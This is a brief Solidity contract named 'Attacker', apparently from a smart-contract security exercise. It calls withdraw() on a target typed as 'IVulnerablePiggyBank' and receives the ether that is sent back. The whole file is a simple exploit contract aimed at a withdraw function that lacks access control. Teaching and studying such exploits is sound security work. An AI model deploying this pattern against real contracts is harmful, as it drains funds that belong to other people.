// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerablePiggyBank {
    function withdraw() external;
}

contract Attacker {
    IVulnerablePiggyBank public target;

    constructor(address _target) {
        target = IVulnerablePiggyBank(_target);
    }

    function attack() public {
        // This will call withdraw() on the vulnerable contract
        target.withdraw();
    }

    receive() external payable {}
}
